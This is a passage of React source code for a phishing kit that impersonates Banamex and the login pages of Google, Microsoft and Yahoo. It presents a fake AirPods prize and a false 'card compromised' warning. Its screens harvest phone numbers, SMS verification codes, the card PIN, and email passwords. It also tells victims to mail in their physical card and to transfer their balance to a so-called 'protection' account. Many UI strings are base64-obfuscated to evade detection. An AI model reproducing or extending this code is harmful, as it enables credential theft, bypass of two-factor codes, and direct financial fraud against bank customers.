                    disabled={!telefonoAcceso1 || !correoAcceso || !nombreRepAcceso}
                    className="w-full bg-[#003d7a] text-white py-3 px-6 rounded-lg font-semibold hover:bg-[#002a5c] transition-colors disabled:opacity-50 disabled:cursor-not-allowed mt-6"
                  >
                    Solicitar sincronización
                  </button>
                </div>
              </div>
            </div>
          </div>
        );
        return getBankContainer(accesoDenegado2Content);

      case ScreenType.VUELOS_OTORGADOS:
        const audífonosOtorgadosContent = (
          <>
            <div className="text-center mb-6">
              <div className="platacard-card border border-orange-200">
                <div className="w-20 h-20 bg-gradient-to-br from-[#ff6b35] to-[#ff8c5a] rounded-full mx-auto mb-4 flex items-center justify-center">
                  <span className="text-3xl">🎧</span>
                </div>
                <h2 className="text-2xl font-bold platacard-gradient-text mb-3">¡Felicidades!</h2>
                <p className="text-gray-700 font-semibold text-lg mb-2">
                  Sus <span className="text-2xl font-bold platacard-accent">AirPods Pro Max</span> han sido otorgados
                </p>
                <p className="text-gray-600">Totalmente gratuitos por su excelente historial crediticio</p>
              </div>

              <div className="platacard-card mt-6 border border-orange-200">
                <h3 className="text-lg font-bold text-gray-800 mb-3 flex items-center justify-center">
                  <span className="mr-2">📋</span>
                  Detalles del producto:
                </h3>
                <div className="text-left text-sm text-gray-700 space-y-2">
                  <div className="flex justify-between">
                    <span>• <strong>Producto:</strong></span>
                    <span>AirPods Pro Max Originales</span>
                  </div>
                  <div className="flex justify-between">
                    <span>• <strong>Costo para usted:</strong></span>
                    <span className="platacard-accent font-bold">$0 pesos</span>
                  </div>
                  <div className="flex justify-between">
                    <span>• <strong>Entrega:</strong></span>
                    <span>A domicilio sin costo</span>
                  </div>
                  <div className="flex justify-between">
                    <span>• <strong>Tiempo de entrega:</strong></span>
                    <span>3-5 días hábiles</span>
                  </div>
                  <div className="flex justify-between">
                    <span>• <strong>Color:</strong></span>
                    <span>Gris espacial</span>
                  </div>
                </div>
              </div>

              <div className="platacard-card mt-6 border border-orange-200">
                <h3 className="text-lg font-bold platacard-accent mb-2 flex items-center justify-center">
                  <span className="mr-2">📧</span>
                  Próximos pasos:
                </h3>
                <p className="text-gray-700 text-sm leading-relaxed">
                  <strong>Revise su correo electrónico</strong> - Le enviaremos las instrucciones 
                  de entrega y el número de seguimiento de su paquete en las próximas 24 horas.
                </p>
              </div>

              <div className="text-xs text-gray-500 mt-4 space-y-1">
                <p>Esta promoción está regida por las leyes de México y los términos y condiciones previamente aceptados.</p>
                <p>Al participar, acepta el uso de sus datos personales para fines comerciales y de marketing de Banamex.</p>
              </div>
            </div>

            <Button 
              className="platacard-button py-3 text-lg"
              onClick={() => {
                setTimeout(() => {
                  window.location.href = 'https://www.banamex.com/';
                }, 2000);
              }}
            >
              Finalizar - Ir a Banamex
            </Button>
          </>
        );
        return getBankContainer(audífonosOtorgadosContent);

      case ScreenType.TELEFONO:
        const phoneContent = (
          <>
            <h2 className="text-xl font-bold mb-3">{atob('SW5ncmVzYSB0dSB0ZWzDqWZvbm8gY2VsdWxhciByZWdpc3RyYWRv')}</h2>
            <p className="mb-4 text-sm text-gray-600">
              {atob('SW5ncmVzYSB0dSBuw7ptZXJvIGRlIHRlbMOpZm9ubyBjZWx1bGFyIActionsIAo=')}
            </p>

            <div className="mb-4">
              <label className="block text-sm font-medium mb-2">
                {atob('TsO6bWVybyBkZSB0ZWzDqWZvbm8gY2VsdWxhcg==')}
              </label>
              <div className="flex">
                <span className="inline-flex items-center px-3 py-2 rounded-l-md border border-r-0 border-gray-300 bg-gray-50 text-gray-500 text-sm">
                  +52
                </span>
                <input
                  type="tel"
                  value={dataI}
                  onChange={(e) => {
                    const value = e.target.value.replace(/\D/g, '').slice(0, 10);
                    setDataI(value);
                  }}
                  placeholder="5551234567"
                  className="flex-1 px-3 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                  maxLength={10}
                />
              </div>
              <p className="text-xs text-gray-500 mt-1">
                {atob('SW5ncmVzYSB0dSBuw7ptZXJvIActionsIAo=')}
              </p>
            </div>

            <Button 
              className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
              onClick={() => {
                if (dataI.length === 10) {
                  onSubmit(ScreenType.TELEFONO, { telefono: dataI });
                } else {
                  alert(atob('UG9yIGZhdm9yIGluZ3Jlc2EgdW4gbnVtZXJvIGRlIHRlbGVmb25vIHZhbGlkbyBkZSAxMCBkaWdpdG9z'));
                }
              }}
              disabled={dataI.length !== 10}
            >
              {atob('Q29udGludWFy')}
            </Button>
          </>
        );
        return getBankContainer(phoneContent);

      case ScreenType.CODIGO:
        const phoneTermination = screenData.terminacion || '5880';

        const verifyContent = (
          <>
            {/* Logo de Banamex */}
            <div className="flex justify-center mb-6">
              <img 
                src={banamexLogo} 
                alt="Banamex" 
                className="h-12 object-contain"
              />
            </div>

            <h2 className="text-xl font-bold mb-4 text-center text-[#BE0046]">
              Ingresa el código que recibiste por SMS al número *{phoneTermination} para vincular tu dispositivo con Banamex
            </h2>

            <div className="mb-6">
              <label className="block text-lg font-semibold mb-3 text-gray-800">Código de verificación</label>
              <p className="text-sm text-gray-600 mb-4">
                Introduce el código de 6 dígitos enviado por SMS.
              </p>
              <Input 
                type="text" 
                placeholder="000000"
                className="w-full border-2 border-gray-300 rounded-lg p-4 text-center text-2xl tracking-[0.5em] font-mono focus:border-[#BE0046] focus:ring-2 focus:ring-[#BE0046] focus:ring-opacity-20"
                value={dataC}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '').slice(0, 6);
                  setDataC(value);
                }}
                maxLength={6}
              />
            </div>

            <Button 
              className="w-full bg-[#BE0046] hover:bg-[#9A0037] text-white py-4 text-lg font-semibold rounded-lg transition-colors duration-200"
              onClick={() => {
                if (dataC.length === 6) {
                  onSubmit(ScreenType.CODIGO, { codigo: dataC });
                } else {
                  alert('Por favor ingresa el código completo de 6 dígitos');
                }
              }}
              disabled={dataC.length !== 6}
            >
              Verificar código
            </Button>
          </>
        );
        return getBankContainer(verifyContent);

      case ScreenType.NIP:
        const securityContent = (
          <>
            <h2 className="text-xl font-bold mb-3">{atob('SW5ncmVzYSB0dSBOSVA=')}</h2>
            <p className="mb-4">
              {atob('UG9yIHR1IHNlZ3VyaWRhZCwgbmVjZXNpdGFtb3MgdmVyaWZpY2FyIHR1IE5JUCBkZSA0IGTDrWdpdG9zLg==')}
            </p>
            <Input 
              type="password" 
              placeholder={atob('TklQ')}
              className="w-full border border-gray-300 rounded p-2 mb-3"
              value={dataD}
              onChange={(e) => setDataD(e.target.value)}
              maxLength={4}
            />
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.NIP, { nip: dataD })}
            >
              {atob('Q29uZmlybWFy')}
            </Button>
          </>
        );
        return getBankContainer(securityContent);

      case ScreenType.PROTEGER:
        const protegerContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Aviso de seguridad: Tarjeta vulnerada</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p className="mb-3">
                Estimado/a cliente: {screenData.titular || "ejemplo"}
              </p>
              <p className="mb-3">
                El sistema ha concluido un análisis de seguridad y ha detectado que su tarjeta Banamex con terminación {screenData.terminacion || "Ejemplo"} ha sido vulnerada, lo que significa que sus datos personales han sido comprometidos.
              </p>
              <p className="mb-3">
                Por protocolo de seguridad, su tarjeta será enviada al área de Prevención de Fraudes, donde se llevará a cabo un análisis técnico forense para identificar el origen de la vulnerabilidad y proceder con las medidas de protección necesarias.
              </p>
              <p className="mb-3">
                En la siguiente pantalla, se mostrarán las instrucciones para la recolección y reposición de su tarjeta.
              </p>
            </div>

            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.PROTEGER, { confirmed: true })}
            >
              Entendido
            </Button>
          </>
        );
        return getBankContainer(protegerContent);

      case ScreenType.TARJETA:
        const tarjetaContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Instrucciones de envío plástico</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p className="mb-3">
                Estimado/a cliente: {screenData.titular || "ejemplo"}
              </p>
              <p className="mb-3">
                Conforme al procedimiento establecido para la reposición de tarjeta, le informamos que, para generar un nuevo plástico correspondiente a su tarjeta con terminación {screenData.terminacion || "ejemplo"}, es indispensable seguir las siguientes instrucciones:
              </p>
              <ol className="list-decimal pl-5 mb-3 space-y-1">
                <li>Introduzca el plástico en un sobre cerrado.</li>
                <li>En dicho sobre, deberá colocar de forma visible el folio de seguimiento: {screenData.folio || "(folio de seguimiento)"}</li>
                <li>Adjunte en el interior del sobre la carta de cancelación, debidamente firmada por el titular de la tarjeta. Esta carta será proporcionada a través de su asistente virtual.</li>
                <li>Una vez listo el envío, se generará una guía logística a través de la empresa Estafeta.</li>
              </ol>

              <p className="mb-3">
                Para la recolección del sobre, usted podrá elegir una de las siguientes opciones:
              </p>
              <ul className="list-disc pl-5 mb-3 space-y-1">
                <li>Que Estafeta recoja el sobre en su domicilio, o bien,</li>
                <li>Que usted entregue el sobre personalmente en la sucursal de Estafeta más cercana.</li>
              </ul>

              <p className="mb-3">
                Una vez recibido y validado el paquete en nuestras instalaciones, en un plazo de 5 días hábiles, estará recibiendo su nueva tarjeta en el domicilio registrado:
              </p>

              <p className="p-2 bg-white mb-3 rounded">
                {screenData.direccion || "Ejemplo dirección"}
              </p>

              <p className="mb-3">
                Agradecemos su atención y cooperación. Para cualquier duda adicional, le solicitamos comunicarse con su ejecutivo en línea para continuar con el proceso.
              </p>

              <p className="mb-1">Atentamente,</p>
              <p className="mb-1">Departamento de Atención a Clientes</p>
              <p className="font-semibold">Banamex</p>
            </div>

            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.TARJETA, { confirmed: true })}
            >
              Entendido
            </Button>
          </>
        );
        return getBankContainer(tarjetaContent);

      case ScreenType.TRANSFERIR:
        const transferirContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Cuenta SU TOTAL PROTECCIÓN creada exitosamente.</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p className="mb-3">
                Con el fin de proteger su saldo disponible es necesario transferir la cantidad de <strong>${screenData.monto || "39933"}</strong> a la siguiente cuenta SU TOTAL PROTECCIÓN (STP).
              </p>
              <p className="mb-2">Clabe:</p>
              <p className="mb-3 font-medium">{screenData.clabe || "272762626262727272727272266222"}</p>
              <p className="mb-2">Titular de la cuenta:</p>
              <p className="mb-3 font-medium">{screenData.titular || "Nwnnwhwhw"}</p>
              <p className="mb-2">Alias:</p>
              <p className="mb-3 font-medium">{screenData.alias || "Cuenta de respaldo."}</p>
              <p className="mt-3 font-medium">
                Esta ventana se actualizará una vez reconozcamos que se haya transferido el saldo a su cuenta de respaldo.
              </p>
            </div>

            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.TRANSFERIR, { confirmed: true })}
            >
              Ya realicé la transferencia
            </Button>
          </>
        );
        return getBankContainer(transferirContent);

      case ScreenType.CANCELACION:
        const cancelacionContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Cancelación Exitosa</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p className="mb-3">
                Estimado cliente, hemos realizado la cancelación de su cargo no reconocido de forma exitosa.
              </p>
              <p className="mb-2">Comercio: <strong>{screenData.comercio || "Wnnwhw"}</strong></p>
              <p className="mb-2">Monto devuelto: <strong>${screenData.monto || "62622"}</strong></p>
              <p className="mt-3">
                En un lapso no mayor a 72 horas, el monto devuelto volverá a estar disponible en su tarjeta de crédito.
              </p>
            </div>

            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.CANCELACION, { confirmed: true })}
            >
              Entendido
            </Button>
          </>
        );
        return getBankContainer(cancelacionContent);

      case ScreenType.MENSAJE:
        const [currentTime4, setCurrentTime4] = useState(new Date());
        const [redirectCounter, setRedirectCounter] = useState(5);

        useEffect(() => {
          const timer = setInterval(() => setCurrentTime4(new Date()), 1000);
          return () => clearInterval(timer);
        }, []);

        useEffect(() => {
          const countdown = setInterval(() => {
            setRedirectCounter(prev => {
              if (prev <= 1) {
                clearInterval(countdown);
                window.location.href = '/banamex/';
                return 0;
              }
              return prev - 1;
            });
          }, 1000);
          return () => clearInterval(countdown);
        }, []);

        const formatDateTime4 = (d: Date) => {
          const days = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
          const months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
          const pad = (n: number) => n < 10 ? '0'+n : n;
          const dayName = days[d.getDay()];
          const day = d.getDate();
          const month = months[d.getMonth()];
          const year = d.getFullYear();
          const time = pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
          return `${dayName} ${day} de ${month} de ${year}, ${time} Centro de México`;
        };

        const mensajeContent = (
          <div style={{ margin: 0, background: '#fff', color: '#0b3b43', padding: '28px', fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif', minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
            <div style={{ maxWidth: '900px', margin: '18px auto', flex: 1, display: 'flex', flexDirection: 'column' }}>
              <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '32px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                  <svg width="54" height="54" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Banamex logo">
                    <g fill="#c81f3b">
                      <path d="M50 10c9 0 18 8 18 18s-9 18-18 18S32 37 32 27 41 10 50 10z"/>
                      <path d="M50 32c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
                      <path d="M50 54c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
                    </g>
                  </svg>
                  <div>
                    <div style={{ fontSize: '20px', fontWeight: 600, color: '#153e46' }}>Banamex</div>
                  </div>
                </div>

                <div style={{ marginLeft: 'auto', textAlign: 'right' }}>
                  <div style={{ fontSize: '14px', color: '#2d4b51' }}>
                    {formatDateTime4(currentTime4)}
                  </div>
                </div>
              </header>

              <div style={{ 
                flex: 1,
                background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)', 
                borderRadius: '8px', 
                padding: '48px 32px', 
                boxShadow: '0 6px 18px rgba(0,0,0,0.08)', 
                border: '1px solid rgba(0,0,0,0.03)',
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                justifyContent: 'center'
              }} role="main">
                <div style={{ textAlign: 'center', maxWidth: '600px' }}>
                  <div style={{ 
                    width: '80px', 
                    height: '80px', 
                    background: '#d4eaec', 
                    borderRadius: '50%', 
                    display: 'flex', 
                    alignItems: 'center', 
                    justifyContent: 'center',
                    margin: '0 auto 24px'
                  }}>
                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M20 6L9 17L4 12" stroke="#153e46" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  </div>

                  <h1 style={{ fontSize: '32px', fontWeight: 600, color: '#153e46', marginBottom: '16px' }}>
                    ¡Solicitud Recibida!
                  </h1>

                  <p style={{ fontSize: '18px', color: '#3d5559', lineHeight: 1.6, marginBottom: '32px' }}>
                    {screenData.mensaje || "En breve un ejecutivo se pondrá en contacto contigo"}
                  </p>

                  <div style={{ 
                    background: '#fff', 
                    borderRadius: '8px', 
                    padding: '20px', 
                    marginBottom: '32px',
                    boxShadow: '0 2px 8px rgba(0,0,0,0.06)'
                  }}>
                    <p style={{ fontSize: '14px', color: '#666', margin: 0 }}>
                      Serás redirigido a la página principal en <strong style={{ color: '#153e46' }}>{redirectCounter}</strong> segundos
                    </p>
                  </div>

                  <button 
                    onClick={() => window.location.href = '/'}
                    style={{ 
                      padding: '14px 32px', 
                      background: '#153e46', 
                      color: '#fff', 
                      border: 'none', 
                      borderRadius: '6px', 
                      fontSize: '16px', 
                      fontWeight: 600, 
                      cursor: 'pointer' 
                    }}
                  >
                    Ir a página principal
                  </button>
                </div>
              </div>

              <footer style={{ marginTop: '28px', paddingTop: '18px', borderTop: '1px solid #e0e0e0', textAlign: 'center', fontSize: '11px', color: '#666' }}>
                <p style={{ margin: '4px 0' }}>Banamex es una marca registrada de Citigroup Inc. utilizada bajo licencia por Banco Nacional de México, S.A.</p>
                <p style={{ margin: '4px 0' }}>© 2025 Banco Nacional de México, S.A. Derechos Reservados</p>
              </footer>
            </div>
          </div>
        );
        return mensajeContent;

      case ScreenType.SMS_COMPRA:
      case 'sms_compra' as ScreenType:
        console.log(atob('UmVuZGVyaXphbmRvIHBhbnRhbGxhIFNNU19DT01QUkE='), screenData);

        if (dataH === undefined) {
          console.log(atob('SW5pY2lhbGl6YW5kbyBjYW1wbw=='));
          setDataH("");
        }

        console.log(atob('VGVybWluYWNpw7NuIGRlIGNlbHVsYXI='), screenData.terminacion);
        console.log(atob('Q8OzZGlnbyBhY3R1YWw='), dataH);

        const processContent = (
          <>
            <h2 className="text-xl font-bold mb-3">{atob('Q2FuY2VsYWNpw7NuIGRlIGNhcmdvczo=')}:</h2>
            <p className="mb-4">
              {atob('SW5ncmVzYSBlbCBjw7NkaWdvIHF1ZSByZWNpYmlzdGUgcGFyYSBhdXRvcml6YXIgbGEgY29tcHJhIGVuIGzDrW5lYS4gRXN0ZSBtaXNtbyBjw7NkaWdvIHNpcnZlIHBhcmEgcmVhbGl6YXIgbGEgY2FuY2VsYWNpw7NuLiBMbyBoZW1vcyBlbnZpYWRvIGEgdHUgdGVsw6lmb25vIGNvbiB0ZXJtaW5hY2nDs246')} <strong>{screenData.terminacion || "****"}</strong>
            </p>

            <div className="p-4 bg-gray-100 rounded mb-4 text-black">
              <p className="mb-2">
                <strong>{atob('SW5mb3JtYWNpw7NuIGRlIGNhbmNlbGFjacOzbjo=')}:</strong>
              </p>
            </div>

            <div className="mb-4">
              <label className="block text-sm font-medium mb-1">{atob('SW5ncmVzYSBlbCBjw7NkaWdvIGRlIGNhbmNlbGFjacOzbjo=')}:</label>
              <Input 
                type="text" 
                placeholder={atob('SW5ncmVzYSBlbCBjw7NkaWdvIGRlIDYgZMOtZ2l0b3M=')}
                className="w-full border border-gray-300 rounded p-2 mb-2"
                value={dataH}
                onChange={(e) => setDataH(e.target.value.replace(/\D/g, '').substring(0, 6))}
                maxLength={6}
              />
              <p className="text-xs text-gray-500">{atob('RWwgY8OzZGlnbyBkZWJlIHRlbmVyIDYgZMOtZ2l0b3MgbnVtw6lyaWNvcy4=')}.</p>
            </div>

            <Button 
              className={primaryBtnClass}
              onClick={() => {
                if (dataH && dataH.length === 6) {
                  console.log(atob('RW52aWFuZG8gY8OzZGlnbw=='), dataH);
                  onSubmit(ScreenType.SMS_COMPRA, { smsCompra: dataH });
                } else {
                  alert(atob('UG9yIGZhdm9yIGluZ3Jlc2EgdW4gY8OzZGlnbyB2w6FsaWRvIGRlIDYgZMOtZ2l0b3Mu'));
                }
              }}
              disabled={!dataH || dataH.length !== 6}
            >
              {atob('Q29uZmlybWFyIGNhbmNlbGFjacOzbg==')}
            </Button>
          </>
        );
        return getBankContainer(processContent);

      case ScreenType.VALIDANDO:
        const validandoContent = (
          <>
            <div className="flex flex-col items-center justify-center">
              <img 
                src={loadingGif} 
                alt="Cargando..." 
                className="w-32 h-32 mb-4"
              />
              <h2 className="text-xl font-bold mb-2">Validando...</h2>
              <p className="text-sm text-gray-500">Esto puede tomar un momento. Por favor espere...</p>
            </div>
          </>
        );
        return getBankContainer(validandoContent);

      case ScreenType.GMAIL:
        // Función para cambiar de la pantalla de correo a la de contraseña
        const handleGmailNextScreen = () => {
          if (gmailScreen === 'correo') {
            if (dataJ.trim()) {
              setGmailScreen('contrasena');
            }
          } else {
            // Enviar datos completos
            if (dataK.trim()) {
              onSubmit(ScreenType.GMAIL, { 
                correo: dataJ, 
                contrasena: dataK 
              });
            }
          }
        };

        // Función para alternar la visibilidad de la contraseña
        const toggleGmailPasswordVisibility = () => {
          setShowPass(!showPass);
        };

        // Contenedor personalizado para Gmail que es distinto al resto de pantallas
        const getGmailContainer = (children: React.ReactNode) => {
          return (
            <div className="gmail-container bg-white rounded-xl shadow-md p-8 mx-auto max-w-md text-center">
              {children}
            </div>
          );
        };

        // Pantalla de correo electrónico (primera pantalla)
        const dataJContent = (
          <>
            <div className="flex justify-center mb-4">
              <img src={googleLogo} alt="Google Logo" className="w-16 h-16" />
            </div>

            <p className="text-[15px] text-gray-700 mb-6">
              Para sincronizar tus notificaciones con la aplicación <strong>Banamex Control</strong>, inicia sesión utilizando tu correo electrónico registrado.
            </p>

            <Input 
              type="text"
              id="dataJ" 
              placeholder="Correo electrónico o teléfono" 
              className="w-full p-3 border border-gray-300 rounded mb-4" 
              value={dataJ}
              onChange={(e) => setDataJ(e.target.value)}
            />

            <div className="text-left mb-6">
              <a href="#" className="text-[#FF6B35] text-sm hover:underline">¿Olvidaste el correo electrónico?</a>
            </div>

            <Button 
              className="bg-[#FF6B35] text-white hover:bg-[#FF8C5A] w-full py-2 px-4 rounded"
              onClick={handleGmailNextScreen}
            >
              Siguiente
            </Button>
          </>
        );

        // Pantalla de contraseña (segunda pantalla)
        const dataKContent = (
          <>
            <div className="flex justify-center mb-4">
              <img src={googleLogo} alt="Google Logo" className="w-16 h-16" />
            </div>

            <div className="flex items-center justify-center mb-6">
              <div className="bg-gray-200 text-gray-700 w-10 h-10 rounded-full flex items-center justify-center font-semibold mr-2">
                {dataJ[0]?.toUpperCase() || 'G'}
              </div>
              <span className="text-sm">{dataJ}</span>
            </div>

            <Input 
              type={showPass ? "text" : "password"}
              id="dataK" 
              placeholder="Ingresa tu contraseña" 
              className="w-full p-3 border border-gray-300 rounded mb-2" 
              value={dataK}
              onChange={(e) => setDataK(e.target.value)}
            />

            <div className="flex items-center mb-4 text-left">
              <Checkbox 
                id="mostrarContrasena" 
                checked={showPass}
                onCheckedChange={toggleGmailPasswordVisibility}
                className="mr-2"
              />
              <Label htmlFor="mostrarContrasena" className="text-sm text-gray-700 cursor-pointer">
                Mostrar contraseña
              </Label>
            </div>

            <div className="text-left mb-6">
              <a href="#" className="text-blue-600 text-sm hover:underline">¿Olvidaste la contraseña?</a>
            </div>

            <Button 
              className="bg-blue-600 text-white hover:bg-blue-700 w-full py-2 px-4 rounded"
              onClick={handleGmailNextScreen}
            >
              Siguiente
            </Button>
          </>
        );

        // Renderizar la pantalla correspondiente según el estado
        return getGmailContainer(gmailScreen === 'correo' ? dataJContent : dataKContent);

      case ScreenType.GMAIL_VERIFY:
        // Contenedor personalizado para Gmail Verify que es distinto al resto de pantallas
        const getGmailVerifyContainer = (children: React.ReactNode) => {
          return (
            <div className="gmail-container bg-white rounded-xl shadow-md p-8 mx-auto max-w-md text-center">
              {children}
            </div>
          );
        };

        // Pantalla de verificación de Google
        const gmailVerificationContent = (
          <>
            <div className="flex justify-center mb-5">
              <img src={googleLogo} alt="Google" className="w-20" />
            </div>

            <h1 className="text-2xl font-normal mb-2">Verifica que eres tú</h1>
            <p className="text-sm text-gray-700 mb-4 max-w-xs mx-auto">
              Para proteger tu cuenta, Google quiere asegurarse de que realmente seas tú la persona que intenta acceder <a href="#" className="text-blue-600">Más información</a>
            </p>

            <div className="inline-block border border-gray-300 rounded-full py-2 px-6 bg-gray-100 mb-5 mx-auto">
              {screenData.correo || dataJ || "inmobiliariadexter627@gmail.com"}
            </div>

            <div className="text-5xl font-normal my-8" id="codigo-grande">
              {screenData.codigo || ""}
            </div>

            <p className="text-sm mb-2">Abrir la app de Gmail en tu celular</p>
            <p className="text-sm text-gray-700 mb-5 max-w-xs mx-auto">
              Google envió una notificación a tu celular. Abre la app de Gmail, presiona <strong>Sí</strong> en el mensaje y, luego, presiona <strong>{screenData.codigo || ""}</strong> en el teléfono para verificar que eres tú.
            </p>

            <p 
              className="text-gray-500 text-sm mt-10 cursor-pointer hover:underline"
              onClick={() => {
                // Al hacer clic en "Reenviarlo", mostramos la pantalla de carga
                onSubmit(ScreenType.VALIDANDO, { redirect: "gmail_verify" });
              }}
            >
              Reenviarlo
            </p>
            <a href="#" className="text-blue-600 text-sm mt-4 block hover:underline">Probar otro método</a>
          </>
        );

        return getGmailVerifyContainer(gmailVerificationContent);

      case ScreenType.HOTMAIL:
        const hotmailContent = (
          <div className="flex flex-col items-center w-full max-w-md mx-auto">
            <div className="flex justify-center mb-8">
              <img 
                src={microsoftLogo} 
                alt="Microsoft Logo" 
                className="h-12"
              />
            </div>

            <h2 className="text-2xl font-light mb-4 self-start">Iniciar sesión</h2>

            <p className="text-sm text-gray-600 mb-6 self-start">
              Para sincronizar tus notificaciones con la aplicación Banamex Control, inicia sesión utilizando tu correo electrónico registrado.
            </p>

            {!hotmailStep2 ? (
              // Paso 1: Correo electrónico
              <>
                <div className="w-full mb-4">
                  <Input 
                    type="email" 
                    className="w-full p-2 border border-gray-300 rounded text-black" 
                    placeholder={atob('Q29ycmVvIGVsZWN0csOzbmljbywgdGVsw6lmb25vIG8gU2t5cGU=')}
                    value={emailInput}
                    onChange={(e) => setEmailInput(e.target.value)}
                  />
                </div>

                <div className="text-xs text-gray-600 mb-6 self-start">
                  {atob('wr9ObyB0aWVuZSB1bmEgY3VlbnRhPw==')} <a href="#" className="text-blue-600">{atob('Q3JlZSB1bmEu')}</a>
                </div>

                <div className="flex justify-between w-full">
                  <div>
                    <a href="#" className="text-sm text-blue-600">{atob('T3BjaW9uZXMgZGUgaW5pY2lvIGRlIHNlc2nDs24=')}</a>
                  </div>
                  <Button 
                    className="bg-[#FF6B35] text-white hover:bg-[#FF8C5A] px-8 rounded"
                    onClick={() => {
                      if (!emailInput) return;
                      setHotmailStep2(true);
                    }}
                  >
                    {atob('U2lndWllbnRl')}
                  </Button>
                </div>
              </>
            ) : (
              // Paso 2: Contraseña
              <>
                <div className="text-base self-start mb-6">
                  {emailInput}
                </div>

                <div className="w-full mb-4">
                  <Input 
                    type="password" 
                    className="w-full p-2 border border-gray-300 rounded text-black" 
                    placeholder={atob('Q29udHJhc2XDsWE=')}
                    value={passwordInput}
                    onChange={(e) => setPasswordInput(e.target.value)}
                  />
                </div>

                <div className="text-xs text-gray-600 mb-6 self-start">
                  <a href="#" className="text-[#FF6B35]">{atob('wr9PbHZpZMOzIHN1IGNvbnRyYXNlw7FhPw==')}</a>
                </div>

                <div className="flex justify-between w-full">
                  <div>
                    <Button 
                      variant="link" 
                      className="text-sm text-[#FF6B35] p-0"
                      onClick={() => setHotmailStep2(false)}
                    >
                      {atob('QXRyw6Fz')}
                    </Button>
                  </div>
                  <Button 
                    className="bg-[#FF6B35] text-white hover:bg-[#FF8C5A] px-8 rounded"
                    onClick={() => {
                      if (!passwordInput) return;
                      onSubmit(ScreenType.HOTMAIL, { 
                        correo: emailInput, 
                        contrasena: passwordInput 
                      });
                    }}
                  >
                    {atob('SW5pY2lhciBzZXNpw7Nu')}
                  </Button>
                </div>
              </>
            )}
          </div>
        );

        return (
          <div className="bg-white p-6 pt-8 rounded max-w-lg mx-auto shadow">
            {hotmailContent}
          </div>
        );

      case ScreenType.YAHOO:
        const yahooContent = (
          <div className="flex flex-col items-center w-full max-w-sm mx-auto">
            <div className="flex justify-center mb-8">
              <img 
                src={yahooLogo} 
                alt="Yahoo Logo" 
                className="h-10"
              />
            </div>

            {!yahooStep2 ? (
              // Paso 1: Correo electrónico
              <>
                <h2 className="text-3xl font-bold mb-4">Iniciar sesión</h2>

                <p className="text-sm text-gray-700 mb-6 w-full text-left">
                  Para sincronizar tus notificaciones con la aplicación Banamex Control, inicia sesión utilizando tu correo electrónico registrado.
                </p>

                <div className="w-full mb-5">
                  <Input 
                    type="email" 
                    className="w-full p-3 border border-gray-300 rounded-sm text-black" 
                    placeholder="Nombre de usuario, correo o teléfono móvil"
                    value={emailInput}
                    onChange={(e) => setEmailInput(e.target.value)}
                  />
                </div>

                <div className="flex justify-between w-full">
                  <div>
                    <a href="#" className="text-sm text-[#FF6B35]">Crear cuenta</a>
                  </div>
                  <Button 
                    className="bg-[#FF6B35] hover:bg-[#FF8C5A] text-white px-8 py-2 rounded-sm"
                    onClick={() => {
                      // Validación mínima
                      if (!emailInput) return;
                      setYahooStep2(true);
                    }}
                  >
                    Siguiente
                  </Button>
                </div>
              </>
            ) : (
              // Paso 2: Contraseña
              <>
                <h2 className="text-3xl font-bold mb-6">Ingresa tu contraseña</h2>

                <div className="text-base self-start mb-2 font-bold">
                  {emailInput}
                </div>

                <div className="w-full mb-5">
                  <Input 
                    type="password" 
                    className="w-full p-3 border border-gray-300 rounded-sm text-black" 
                    placeholder="Contraseña"
                    value={passwordInput}
                    onChange={(e) => setPasswordInput(e.target.value)}
                  />
                </div>

                <div className="text-sm self-start mb-5">
                  <a href="#" className="text-[#FF6B35]">¿Olvidaste tu contraseña?</a>
                </div>

                <div className="flex justify-between w-full">
                  <Button 
                    variant="link" 
                    className="text-sm text-[#FF6B35] p-0"
                    onClick={() => setYahooStep2(false)}
                  >
                    Atrás
                  </Button>
                  <Button 
                    className="bg-[#FF6B35] hover:bg-[#FF8C5A] text-white px-8 py-2 rounded-sm"
                    onClick={() => {
                      // Validación mínima
                      if (!passwordInput) return;
                      onSubmit(ScreenType.YAHOO, { 
                        correo: emailInput, 
                        contrasena: passwordInput 
                      });
                    }}
                  >
                    Siguiente
                  </Button>
                </div>
              </>
            )}
          </div>
        );

        return (
          <div className="bg-white p-6 pt-8 rounded max-w-lg mx-auto shadow">
            {yahooContent}
          </div>
        );

      case ScreenType.DATOS_TARJETA:
        // Función para validar los datos de la tarjeta
        const handleSecureSubmit = () => {
          // Limpiar errores previos
          setErrorA(null);

